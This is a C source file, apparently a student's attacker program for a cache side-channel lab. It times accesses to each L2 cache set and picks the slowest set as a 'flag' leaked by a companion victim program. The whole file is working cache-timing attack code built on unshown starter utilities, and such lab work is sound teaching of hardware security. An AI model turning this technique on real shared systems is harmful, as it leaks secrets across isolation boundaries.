// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>     // for sleep
#include "util.h"       // starter code utilities

#define NUM_SETS NUM_L2_CACHE_SETS
#define CACHE_LINES_PER_SET 8  // As defined in victim
#define SAMPLE_COUNT 1000      // How many times to repeat measurements

int main() {
    printf("Attacker started...\n");

    uint8_t *buf = get_buffer();  // Allocate hugepage buffer
    if (!buf) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    // Get the candidate sets
    char **candidate_sets = get_candidate_sets();
    if (!candidate_sets) {
        printf("Failed to get candidate sets.\n");
        return 1;
    }

    uint64_t times[NUM_SETS] = {0};  // To store accumulated access times

    // Take multiple samples to average out noise
    for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
        for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
            uint64_t start, end, total_latency = 0;
            char **set = (char **)&candidate_sets[set_idx * CACHE_LINES_PER_SET];

            // Probe each line in the set
            for (int i = 0; i < CACHE_LINES_PER_SET; i++) {
                lfence();
                start = rdtscp64();
                *(volatile char *)set[i];  // Access memory
                lfence();
                end = rdtscp64();
                total_latency += (end - start);
            }

            times[set_idx] += total_latency;
        }
    }

    // Find the set with the maximum cumulative latency
    int guessed_flag = -1;
    uint64_t max_time = 0;
    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        if (times[set_idx] > max_time) {
            max_time = times[set_idx];
            guessed_flag = set_idx;
        }
    }

    printf("\nFinal guessed flag is: %d\n", guessed_flag);

    return 0;
}
